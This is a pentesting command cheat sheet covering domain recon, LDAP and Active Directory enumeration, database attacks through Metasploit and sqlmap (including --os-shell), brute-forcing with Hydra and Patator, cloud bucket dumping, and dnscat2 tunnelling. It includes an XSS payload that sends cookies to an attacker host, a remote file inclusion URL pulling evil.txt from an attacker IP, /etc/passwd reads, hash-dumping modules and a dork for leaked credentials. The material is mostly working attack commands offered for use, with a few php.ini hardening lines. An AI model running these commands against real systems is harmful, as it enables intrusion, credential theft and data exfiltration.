curl -sL --header "Host:viewdns.info" --referer https://viewdns.info --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" https://viewdns.info/reversewhois/?q=$CompanyURL


curl -Iks --location -X GET -A "x-agent" --proxy http://10.64.0.1:1080 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy http://10.8.0.1:1080 $Domain



##-===================================-##
##   [+] Spyse - Subdomain Lookup:
##-===================================-##
spyse -target $Domain --subdomains


##-===============================================-##
##   [+] Spyse - Get Autonomous System Details:
##-===============================================-##
echo "AS15169" | spysecli as


##-========================================-##
##   [+] Spyse - Get IPv4 Host Details:
##-========================================-##
echo "$DNSIP" | spysecli ip


##-===================================-##
##   [+] Spyse - Reverse IP Lookup:
##-===================================-##
echo "$DNSIP" | spysecli reverse-ip


##-===================================-##
##   [+] Spyse - Reverse NS Lookup:
##-===================================-##
echo "ns1.$Domain.com" | spysecli reverse-ns


##-==================================-##
##   [+] Spyse - Subdomain Lookup:
 ##-===================================-##
echo "$Domain" | spysecli subdomains


##-==============================================-##
##   [+] Spyse - Get Historical DNS A Records:
##-==============================================-##
echo "$Domain" | spysecli history-dns-a


##-==============================================-##
##   [+] Spyse - Get Historical DNS NS Records:
##-==============================================-##
echo "$Domain" | spysecli history-dns-ns






curl -s https://crt.sh/?q=%25.$Target
curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u


censys.io/domain?q=
censys.io/certificates?q=




curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u

curl https://www.virustotal.com/en/domain/$target/information/ -H 'Host: www.virustotal.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -m 30 | grep information | grep "$target" | awk '{print $3}' | sed 's/\// /g' | awk '{print $4}' >> /tmp/onlineFoundSubdomains





https://api.hackertarget.com/pagelinks/?q=
https://api.hackertarget.com/hostsearch/?q=


curl https://api.hackertarget.com/whois/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nping/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/findshareddns/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/geoip/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/zonetransfer/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/httpheaders/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/hostsearch/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/dnslookup/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/reversedns/?q=$ip --connect-timeout 15
curl https://api.hackertarget.com/mtr/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/subnetcalc/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15


curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u

curl http://api.hackertarget.com/hostsearch/?q=$target -m 30 | sed 's/,/ /' | awk '{print $1}' | grep "$target" >> /tmp/onlineFoundSubdomains




[+]certspotter
		curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
	[+]crtsh
		curl -s https://crt.sh/?q=%.$1  | sed 's/<\/\?[^>]\+>//g' | grep $1


    curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
    curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .FDNS_A[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .RDNS[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://tls.bufferover.run/dns?q=.$1" | jq -r .Results 2>/dev/null | cut -d ',' -f3 | grep -o "\w.*$1"| sort -u >> tmp.txt &
    curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u >> tmp.txt &
    curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep -oaEi "https?://[^\"\\'> ]+" | grep $1 | sed 's/https\?:\/\///' | cut -d "/" -f3 | sort -u >> tmp.txt &
    curl -s "https://riddler.io/search/exportcsv?q=pld:$1" | grep -o "\w.*$1" | cut -d ',' -f6 | sort -u >> tmp.txt &
    curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$1" | jq '.subdomains' | cut -d '"' -f2 | cut -d '[' -f1 | cut -d ']' -f1 | grep . | sort -u >> tmp.txt &
    curl -s "https://api.threatminer.org/v2/domain.php?q=$1&rt=5" | jq -r '.results[]' | sort -u >> tmp.txt &
    curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u >> tmp.txt &



##-==================================================-##
##   [+] OSINT - DNSDumpster API - Enum Scanner: 
##-==================================================-##
csrftoken=$(curl -ILs https://dnsdumpster.com | grep csrftoken | cut -d " " -f2 | cut -d "=" -f2 | tr -d ";")
curl -s --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$csrftoken&targetip=$1" --cookie "csrftoken=$csrftoken; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com >> dnsdumpster.html

if [[ -e $1 && -s $1 ]]; then # file exists and is not zero size
    cat dnsdumpster.html | grep "https://api.hackertarget.com/httpheaders" | grep -o "\w.*$1" | cut -d "/" -f7 | grep '.' | sort -u >> tmp.txt
fi




##-==================================================-##
##   [+] OSINT - URLScan.io API - Domain Scanner 
##-==================================================-##
curl -s "https://urlscan.io/api/v1/search/?q=domain:$1" | jq -r '.results[].page.domain' | sort -u >> tmp.txt &

curl --insecure -L -s "https://urlscan.io/api/v1/search/?q=domain:$Domain" 2> /dev/null | egrep "country|server|domain|ip|asn|$Domain|prt"| sort -u | tee $DIR/urlscanio-$Domain.txt









##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Shodan - Recon + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nmap --script shodan-api.nse








##-================================================-##
##   [+] NMap NSE - Netblock OSINT - ASN Scanner:
##-================================================-##
## --------------------------------------------------------------- ##
##   [?] Find netblocks that belong to an ASN using targets-asn
## --------------------------------------------------------------- ##
nmap --script targets-asn --script-args targets-asn.asn=$ASN




##-===================================================================-##
##   [+] NMap - NSE Scans - ASN Query + IP Geolocation Information:
##-===================================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


##-==================================================-##
##   [+] IP-API - Find ASN for a given IP address
##-==================================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as



##-=======================================================================-##
##   [+] ss - Lookup Autonomous Systems of All Outgoing http/s Traffic:
##-=======================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] LDAP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



dpkg-reconfigure -plow slapd
##  Omit OpenLDAP server configuration? No
##  DNS Domain Name: frozza.com
##  Organizaion name: Frozza
##  Administrator password: qwe123

##  DB backend: HDB
##  Remove when slapd is purged: No
##  Allow v2 protocol: No

ps -ef | grep slapd
##   slapdopenldap  3320     1  0 22:29 ?        00:00:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d






nmap --script ldap-search.nse $IP
nmap --script ldap-rootdse.nse $IP
nmap --script ldap-novell-getpass.nse $IP
nmap --script ldap-brute.nse $IP

ldapsearch -x -h target-ip -b "dc=domain,dc=tld"


## ----------------------------------------------------------- ##
##   [?] LDAP/Active Directory - Search for anonymous bind
## ----------------------------------------------------------- ##
ldapsearch -x -b "dc=megabank,dc=local" "\*" -h  $ip




## ------------------------------------------------- ##
##   [?] LDAP/Active Directory - Anonymous Bind:
## ------------------------------------------------- ##
ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"


## ------------------------------------------------- ##
##   [?] LDAP/Active Directory - Authenticated:
## ------------------------------------------------- ##
ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W


## --------------------------------------------------------- ##
##   [?] LDAP/Active Directory - Look for Anonymous Bind:
## --------------------------------------------------------- ##
ldapsearch -x -b "dc=megabank,dc=local" "*" -h $ip




/var/lib/ldap               ## DB directory - Contains DITs

cn=config (default)         ## root config of LDAP instance server wide.




Dump (all) Default Configuration:

ldapsearch -Y EXTERNAL -H ldapi:/// -b "cn=config"




slapcat -v -l backup_ldap.ldif


ps -ef | grep slapd



windapsearch.py -d host.domain.tld -u domain\\ldapbind -p password -U


##-==================================================-##
##   [+] Obtain domain information using windows:
##-==================================================-##
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName


net group "Domain Controllers" /domain
net group "Domain Admins" /domain
net users /domain
net accounts


##-==================================-##
##   [+] DNS Lookup - LDAP Records
##-==================================-##
nslookup -type=SRV _ldap._tcp.

nslookup -type=SRV _ldap._tcp.dc_msdcs.//DOMAIN/











##-===============================================================-##
##   [+] bloodhound - LDAP Active Directory - Lateral Movement
##-===============================================================-##
## --------------------------------------------------------------- ##
##   [?] invoke-bloodhound from sharphound.ps1 
## --------------------------------------------------------------- ##
import-module .\sharphound.ps1
invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] iSCSI - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nmap --script iscsi-info.nse $IP



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SQL - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "mysql" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=3306 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "postgres" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=5432 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;


nmap --script=pgsql* -p 5432 $TARGET
nmap --script=mysql* -p 3306 $TARGET



nmap --script=broadcast-ms-sql-discover.nse $IP
nmap --script ms-sql-info.nse $IP
nmap --script mysql-info.nse $IP
nmap --script ms-sql-ntlm-info.nse $IP
nmap --script mysql-enum.nse $IP
nmap --script mysql-users.nse $IP
nmap --script=ms-sql-tables.nse $IP
nmap --script=ms-sql-config.nse $IP
nmap --script=ms-sql-query.nse $IP
nmap --script mysql-query.nse $IP
nmap --script=ms-sql-dump-hashes.nse $IP
nmap --script mysql-dump-hashes.nse $IP
nmap --script=ms-sql-empty-password.nse $IP
nmap --script mysql-empty-password.nse $IP
nmap --script=ms-sql-hasdbaccess.nse $IP
nmap --script=mysql-variables.nse $IP
nmap --script=ms-sql-xp-cmdshell.nse $IP
nmap --script=ms-sql-brute.nse $IP
nmap --script mysql-vuln-cve2012-2122.nse $IP



##-==================================================-##
##   [+] NMap - ms-SQL All NSE Scans - Show Vulns
##-==================================================-##
nmap --script ms-sql-* --script-args vulns.showall $IP -oN nmap_mssql_$IP.txt


##-=============================================-##
##   [+] Metasploit - MySQL Auxiliary Scanner
##-=============================================-##
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU -Pn -n -T4 --open -p1434 <targetRange>


##-=============================================-##
##   [+] NMap - MySQL - Enumeration + Brute
##-=============================================-##
nmap -p1433 --script ms-sql-info <targetIP>
nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <targetIP>


##-=========================================-##
##   [+] Metasploit - MySQL Enumeration:
##-=========================================-##
msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/admin/mssql/mssql_enum
msf > use auxiliary/scanner/mssql/mssql_hashdump
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner


##-================================================-##
##   [+] Metasploit - MySQL - Post Exploitation
##-================================================-##
msf > use auxiliary/admin/mssql/mssql_exec



##-=======================================-##
##   [+] Nmap - Ms-SQL Every NSE Script
##-=======================================-##
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP -p 3306



##-================================================-##
##   [+] MySQLDump - Backup All MySQL Databases:
##-================================================-##
mysqldump -u $User -p $Pass --all-databases --single-transaction


##-=======================================================-##
##   [+] MySQLClient - Connect to Windows ms-SQL Server
##-=======================================================-##
mssqlclient.py -windows-auth $User@$IP
mssql-cli -S $IP -U $User


mssqlclient.py -port 27900 $User:$Pass@$IP
sqsh -S $IP -U $User -P $Pass


##-=========================================-##
##   [+] THC-Hydra - Brute Force - MySQL
##-=========================================-##
hydra -l sa -P ../creds/pass.txt $IP -s target-port mssql

hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql
hydra -v -l root -P $PassFile.lst -t 1 mysql://$IP -o brute_mysql.out
hydra -v -l sa -P $PassFile.lst -t 4 $IP mssql -o brute_mssql.out
hydra -t 5 -V -f -l sa -P "C:\$PassFile.txt" 1.2.144.244 mssql
hydra mssql://$IP:1433 -l sa -P /root/Desktop/$PassFile





## ---------------------------------------------------------- ##
##   [?] Patator - mssql_login Module - Brute-force MSSQL
## ---------------------------------------------------------- ##
## 
## ---------------------------------------------------------- ##
##   [?] Patator - mysql_login Module - Brute-force MySQL
## ---------------------------------------------------------- ##
## 
## ----------------------------------------------------------------- ##
##   [?] Patator - mysql_query Module - Brute-force MySQL queries
## ----------------------------------------------------------------- ##
## 
## ----------------------------------------------------------------- ##
##   [?] Patator - pgsql_login  Module - Brute-force PostgreSQL
## ----------------------------------------------------------------- ##



patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,retry:code=500

patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,retry:code=500





sqlmap -u http://$Domain --crawl 3 --dbs --answer="redirect=Y" --batch 



## --------------------------------------------------------------------------------------- ##
##   [?] sqlmap - post-request - captured request via Burp Proxy via Save Item to File
## --------------------------------------------------------------------------------------- ##
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10




sqlmap.py -u '$URL' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10 --forms
------------------------------------------------------------------------------------------------------

Use Burp to trap a request. Copy the request to /root/tmp.

sqlmap.py -r /root/tmp --banner                                              Show webserver OS, apps and db
sqlmap.py -r /root/tmp --dbms=<db type> --dbs                                Show all dbs available
sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> --current-user        Show the user the web server is using to talk to the db
sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     

Example
sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --dbs

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa --tables

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users --columns

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump

sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell









Scuba

• MSSQL DataMask
• SQLRECON




##-=========================================-##
##   [+] Medusa - Bruteforce basic_auth:
##-=========================================-##
medusa -h $IP -U ../creds/usernames.txt -P ../creds/passwords.txt -M http -m DIR:/printers -T 10



##-======================================================-##
##   [+] Patator - http_fuzz Module - Brute-force HTTP
##-======================================================-##
patator http_fuzz url=http://$line/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&target=index.php&lang=en&token=' 0=$PASSWORD before_urls=http://$line/phpmyadmin/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf

patator http_fuzz url=http://$line/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=$arg2 before_urls=http://$line/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] phpMyAdmin - Web Server + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------ ##
##    [?] phpMyAdmin - Web Server - 
## ------------------------------------------ ##


##-===============================================-##
##   [+] THC-Hydra - Brute Force - phpMyAdmin:
##-===============================================-##
hydra -l root -P /home/infosecaddicts/list.txt -e n http-post-form://$IP -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"




hardening-php-through-php-ini-configuration-file
php.ini 


display_errors = Off
log_errors = On
allow_url_fopen = Off
safe_mode = On
expose_php = Off
enable_dl = Off
disable_functions = system, show_source, symlink, exec, dl, shell_exec, passthru, phpinfo, escapeshellarg, escapeshellcmd






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Tomcat - Web Server + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## -------------------------------------- ##
##    [?] Tomcat Web Server - 
## -------------------------------------- ##


##-====================================================-##
##   [+] THC-Hydra - Brute Force - Tomcat Web Server
##-====================================================-##
hydra -l tomcat -P list.txt -e ns -s 8080 -vV $IP http-get /manager/html



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Oracle - Database + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## -------------------------------------- ##
##    [?] Oracle Database - Port 1521
## -------------------------------------- ##

tnscmd10g version -h $IP
tnscmd10g status -h 





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] XSS - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ------------------------------------ ##
##    [?] Cross Site Scripting (XSS)
## ------------------------------------ ##





## ------------------------------------------------------------------------- ##
##   [?] XsSScan - Traverse websites and subdomains to find links, then
##   [?]           Search for Cross Site Scripting (XSS) Vulnerabilities
## ------------------------------------------------------------------------- ##


XsSCan.py -u $Domain 


##-======================================-##
##   [+] XsSScan - Comprehensive Scan:
##-======================================-##
XsSCan.py -u $Domain -e 


##-====================================-##
##   [+] XsSScan - Verbose Logging:
##-====================================-##
XsSCan.py -u $Domain -v


##-======================================-##
##   [+] XsSScan - Cookies
##-======================================-##
XsSCan.py -u $Domain.complex -c name=$Name name=$Name




## ------------------------------------------------ ##
##   [?] Cross-Site Request Forgery (XSRF/CSRF)
## ------------------------------------------------ ##




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] Cross-Site Request Forgery (XSRF/CSRF) - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------------ ##
##   [?] Cross-Site Request Forgery (XSRF/CSRF)
## ------------------------------------------------ ##




xsstracer $Domain 80


xsser -u http://$Domain -c10 --Cw=200 --auto --save --follow-redirects



curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`


Stored - example: guestbook
<script>alert("XSS");</script>
<script>alert(document.cookie);</script>
<iframe SRC="http://attackerIP" height="0" width="0"></iframe>
<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Remote File Inclusion (RFI) - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------- ##
##   [?] Local File Inclusion (LFI)
## ------------------------------------- ##

## ------------------------------------- ##
##   [?] Remote File Inclusion (RFI)
## ------------------------------------- ##



http://$TargetIP/index.php?page=http://$AttackerIP/evil.txt




fimap -u "http://INSERTIPADDRESS/example.php?test="


# Ordered output
curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=





## ----------------------------------- ##
##   [?] Cross-Site Tracing (XST)
## ----------------------------------- ##



##-====================================================-##
##   [+] Curl - Check for Cross-Site Tracing (XST)
##-====================================================-##
curl -X TRACE $IP
curl -X TRACE -H "Cookie: name=value" $Domain




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Cloud - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



AWSBucketDump.py -l $File.txt
AWSBucketDump.py -D -l BucketNames.txt -g s.txt



php s3-buckets-bruteforcer.php --bucket gwen001-test002



s3scanner.py --include-closed --out-file $File.txt --dump $File.txt



## ---------------------------------------------- ##
##   [?] CloudBrute - Awesome Cloud Enumerator
## ---------------------------------------------- ##
cloudbrute --domain $Domain

cloudbrute --mode storage           ## storage or app. Default: storage
cloudbrute --mode app

cloudbrute --output $File.txt       ## Output file
cloudbrute --proxy $File.txt        ## use proxy list
cloudbrute --randomagent            ## user agent randomization
cloudbrute --debug                  ## show debug logs
cloudbrute --keyword $Syntax        ## keyword used to generator urls
cloudbrute --wordlist $File         ## path to wordlist



##-==========================================-##
##   [+] Cloud_Enum - Find Cloud Services
##-==========================================-##
cloud_enum --keyword $Keyword 
cloud_enum --keyfile $KeyFile 
cloud_enum --brute /usr/lib/cloud-enum/enum_tools/fuzz.txt 
cloud_enum --nameserver $DNS 
cloud_enum --logfile /var/log/$File 
cloud_enum --format text 
cloud_enum --format json 
cloud_enum --format csv 





CloudScraper.py -u $Domain




##-===========================================================-##
##   [+] ScoutSuite - Multi-Cloud Security Assessment Tool
##-===========================================================-##


python scout.py aws --access-keys --access-key-id $KeyID --secret-access-key $SecretAccessKey --session-token $Token


source scoutsuite/bin/activate


scout aws --profile $Profile --no-browser --report-dir /tmp/scout-report






##-==========================================-##
##   [+] Pacu - AWS Exploitation Framework
##-==========================================-##

python3 pacu.py

TestSession

set_keys
import_keys --all ~/.aws/credentials

Key alias: 
Access key ID: 
Secret access key: 
Session token: 

update_regions

run 
exec 

s3_finder
enum_ec2
acm_enum
iam_enum_users
iam_enum_roles
vpc_enum_lateral_movement

s3_download_bucket








##-=========================-##
##   [+] AWS Buckets Dorks
##-=========================-##
site:*.s3.amazonaws.com ext:xls | ext:xlsx | ext:csv password|passwd|pass user|username|uid|email
site:*.amazonaws.com -www "compute"
site:*.amazonaws.com -www "compute" "ap-south-1"
site:pastebin.com "rds.amazonaws.com" "u " pass OR password




aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws iam get-account-password-policy
aws sts get-session-token



athenaquery="SELECT * FROM rapid7_fdns_any WHERE name LIKE '%."$scope"' AND date = (SELECT MAX(date) from rapid7_fdns_any)"

queryid=$(aws athena start-query-execution --query-string "$athenaquery" --query-execution-context Database=default --result-configuration OutputLocation=s3://your-athena-results-bucket-here/ --output text

aws athena get-query-execution --query-execution-id "$queryid" --output json

aws athena get-query-results --query-execution-id "$queryid" --output json









## --------------------------------------------- ##
##   [?] DNSCat - Pentesting - DNS Tunneling
## --------------------------------------------- ##



dnscat2.rb 
dnscat2> New session established: 1422 
dnscat2> session -i 1422


## ------------------------- ##
##   [?] Target Machine:
## ------------------------- ##
dnscat --host $ServerIP



##-==================================-##
##   [+] Start the dnscat2 Server
##-==================================-##
dnscat2.rb --security=authenticated --secret=12viFdfMonso3dF $Domain



##-=================================-##
##   [+] Start the dnscat2 Client
##-=================================-##
dnscat --retransmit-forever --secret=12viFdfMonso3dF $Domain







## ----------------------------------------------- ##
##  [+] Use Grep and regex to output to a file
## ----------------------------------------------- ##
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt



## ----------------------------------------------------- ##
##   [?] Use bash loop to find IP behind each host
## ----------------------------------------------------- ##
for url in $(cat list.txt); do host $Domain; done



## -------------------------------------- ##
##   [?] DNS Zone Transfer - Bash Loop
## -------------------------------------- ##
for x in $(host -t ns $Domain | cut -d ' ' -f4); do
     host -l $Domain $x
done



## ------------------------------------------------ ##
##   [?] DNS Subdomain - IP Address Enumeration
## ------------------------------------------------ ##
for x in $(cat /usr/share/dnsenum/dns.txt); do
     host $x.$Domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TCPDump - Packet Sniffer
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-======================================-##
##   [+] Get Cisco network information
##-======================================-##
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'





## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 src 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
